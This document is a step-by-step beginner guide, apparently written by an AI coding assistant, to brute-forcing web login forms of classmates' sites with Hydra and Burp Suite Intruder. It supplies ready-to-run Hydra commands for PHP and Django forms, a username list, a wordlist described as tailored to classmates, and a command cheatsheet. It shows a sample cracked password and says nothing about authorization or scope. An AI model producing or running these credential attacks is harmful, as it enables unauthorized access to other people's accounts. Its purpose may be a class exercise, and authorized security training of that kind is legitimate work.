# 🔓 Brute Force with Hydra — Beginner Guide

## What is Hydra?

Hydra is a command-line tool that **automatically tries many passwords** against a login form, very fast. Instead of you manually typing passwords one by one, Hydra reads from a wordlist file and tries each one. If one works, it tells you.

---

## Step 1: Install Hydra

Open your terminal and run:
```bash
sudo apt install hydra -y
```
*(Enter your Linux password when prompted: you know it)*

**Verify it installed:**
```bash
hydra -h
```
You should see a help page with options. If you see it, Hydra is ready.

---

## Step 2: The Custom Wordlist

I already created a custom wordlist at:
```
/home/nasju/Desktop/htdocs/oo-main/day6-2/day6/custom_wordlist.txt
```

It contains **250+ passwords** tailored to your classmates including:
- Visayan slang: `yawa`, `boang`, `giatay`, `bilat`, `otendaku`, etc.
- Common student passwords: `admin123`, `password`, `thesis123`
- Pop culture: `blackpink123`, `mlbb123`, `valorant123`
- Variations with numbers: `69`, `123`, `00`, `321`

**To see how many passwords are in the list:**
```bash
wc -l /home/nasju/Desktop/htdocs/oo-main/day6-2/day6/custom_wordlist.txt
```

---

## Step 3: Figure Out the Login Form Parameters

Before running Hydra, you need to know exactly how the target's login form works. Here's how:

### 3a. Inspect the Login Form

1. Go to the target's login page in your browser
2. Right-click on the login form → **"Inspect"**
3. Look at the HTML and find:
   - The **form's [action](file:///home/nasju/Desktop/htdocs/oo-main/day6-2/day6/php/RequestValidator.php#187-219)** attribute — this is the URL it submits to
   - The **[name](file:///home/nasju/Desktop/htdocs/oo-main/day6-2/day6/php/TenantMiddleware.php#103-110)** of the username field
   - The **[name](file:///home/nasju/Desktop/htdocs/oo-main/day6-2/day6/php/TenantMiddleware.php#103-110)** of the password field
   - The **`method`** (POST or GET)

**Example — what you might see:**
```html
<form method="POST" action="login.php">
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">Login</button>
</form>
```
From this you learn:
- Method: **POST**
- URL path: **login.php**
- Username field name: **username**
- Password field name: **password**

### 3b. Find the Failure Message

Try logging in with a wrong password and note the **exact error message**:
- "Invalid credentials"
- "Wrong password"
- "Username not found"
- "Login failed"

You'll need this for Hydra to know when a login **failed** (so it can keep trying).

---

## Step 4: Run Hydra

### For PHP Sites (XAMPP)

```bash
hydra -l admin -P /home/nasju/Desktop/htdocs/oo-main/day6-2/day6/custom_wordlist.txt TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
```

**Let me break down every part:**

| Part | Meaning |
|---|---|
| `hydra` | The command itself |
| `-l admin` | Try the username `admin` (lowercase L = single username) |
| `-P /path/to/custom_wordlist.txt` | Use this wordlist for passwords (uppercase P = password file) |
| `TARGET_IP` | Replace with the target's IP address (e.g., `192.168.1.105`) |
| `http-post-form` | We're attacking an HTTP POST login form |
| `"/login.php:..."` | The attack string (explained below) |

**The attack string has 3 parts separated by `:`**

```
/login.php : username=^USER^&password=^PASS^ : F=Invalid
    ↑              ↑                              ↑
    │              │                              │
  URL path    Form data with placeholders    Failure indicator
```

- [/login.php](file:///home/nasju/Desktop/htdocs/oo-main/day6-2/day6/php/login.php) — the path the form submits to (from Step 3a)
- `username=^USER^&password=^PASS^` — the form fields. `^USER^` and `^PASS^` are Hydra's placeholders
- `F=Invalid` — if the response contains the word "Invalid", it's a failed attempt. Change this to match the target's actual error message!

### Example with Different Error Messages

If the error says **"Wrong password"**:
```bash
hydra -l admin -P /home/nasju/Desktop/htdocs/oo-main/day6-2/day6/custom_wordlist.txt 192.168.1.105 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password"
```

If the error says **"Username not found"**:
```bash
hydra -l admin -P /home/nasju/Desktop/htdocs/oo-main/day6-2/day6/custom_wordlist.txt 192.168.1.105 http-post-form "/login.php:username=^USER^&password=^PASS^:F=not found"
```

### For Django Sites

Django login forms also need a **CSRF token**. Hydra has trouble with this, so for Django targets, use **Burp Suite Intruder** instead (see Step 7 below).

But if you want to try anyway:
```bash
hydra -l admin -P /home/nasju/Desktop/htdocs/oo-main/day6-2/day6/custom_wordlist.txt TARGET_IP http-post-form "/accounts/login/:username=^USER^&password=^PASS^&csrfmiddlewaretoken=TOKEN:F=Please enter a correct"
```
*(You'd need to grab the CSRF token from the page first — this is tricky. Burp Intruder is easier for Django.)*

---

## Step 5: Try Multiple Usernames

If you don't know the username either, create a **username wordlist**:

```bash
cat > /home/nasju/Desktop/htdocs/oo-main/day6-2/day6/usernames.txt << 'EOF'
admin
user
test
root
administrator
student
user1
user2
demo
guest
staff
teacher
manager
EOF
```

Then use `-L` (uppercase) instead of `-l`:
```bash
hydra -L /home/nasju/Desktop/htdocs/oo-main/day6-2/day6/usernames.txt -P /home/nasju/Desktop/htdocs/oo-main/day6-2/day6/custom_wordlist.txt TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
```

This tries **every username × every password** combination.

---

## Step 6: Reading Hydra's Output

**While running, you'll see:**
```
Hydra v9.4 (c) 2022 by van Hauser/THC
[DATA] max 16 tasks per 1 server, overall 16 tasks
[DATA] attacking http-post-form://192.168.1.105:80/login.php
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 189 to do in 00:03h
```
This means Hydra is trying 64 passwords per minute.

**When it finds a password:**
```
[80][http-post-form] host: 192.168.1.105   login: admin   password: yawa123
1 of 1 target successfully completed, 1 valid password found
```
🎉 **Password found!** The login is `admin` with password `yawa123`

**If nothing is found:**
```
1 of 1 target completed, 0 valid passwords found
```
This means none of the passwords in your wordlist matched.

---

## Step 7: Alternative — Burp Suite Intruder (If Hydra is Too Tricky)

If Hydra gives you issues (especially against Django sites with CSRF), use Burp Suite Intruder instead:

1. **Set up Burp Suite** (see playbook Phase 3)
2. Login to the target with a wrong password — Burp intercepts the request
3. **Right-click** the request → **"Send to Intruder"**
4. Go to the **Intruder** tab

**In Positions tab:**
5. Click **"Clear §"** to remove all markers
6. Highlight the password value → Click **"Add §"**
```
username=admin&password=§wrongpassword§
```

**In Payloads tab:**
7. **Payload type:** Simple list  
8. Click **"Load..."** button  
9. Navigate to and select: [custom_wordlist.txt](file:///home/nasju/Desktop/htdocs/oo-main/day6-2/day6/custom_wordlist.txt)  
10. All 250+ passwords load into the list  

**Start:**
11. Click **"Start attack"**  

**Reading results:**
- A table shows each attempt — look at the **"Length"** column
- Most will have the SAME length (these are failures)
- If one has a **DIFFERENT length** — that's likely the correct password!
- Also check **"Status"** column — a `302` redirect usually means successful login

---

## ⚡ Quick Command Cheatsheet

```bash
# Install Hydra
sudo apt install hydra -y

# Basic: Single username, wordlist passwords
hydra -l admin -P custom_wordlist.txt TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Multiple usernames + passwords
hydra -L usernames.txt -P custom_wordlist.txt TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Verbose mode (shows every attempt)
hydra -V -l admin -P custom_wordlist.txt TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Limit to 4 threads (be less aggressive)
hydra -t 4 -l admin -P custom_wordlist.txt TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Show progress with wait time
hydra -W 2 -l admin -P custom_wordlist.txt TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
```

> [!IMPORTANT]
> **Remember to replace these in every command:**
> - `TARGET_IP` → the actual IP address (e.g., `192.168.1.105`)
> - [/login.php](file:///home/nasju/Desktop/htdocs/oo-main/day6-2/day6/php/login.php) → the actual login URL path
> - `username` and `password` → the actual form field names (from Step 3)
> - `F=Invalid` → the actual error message text from the target
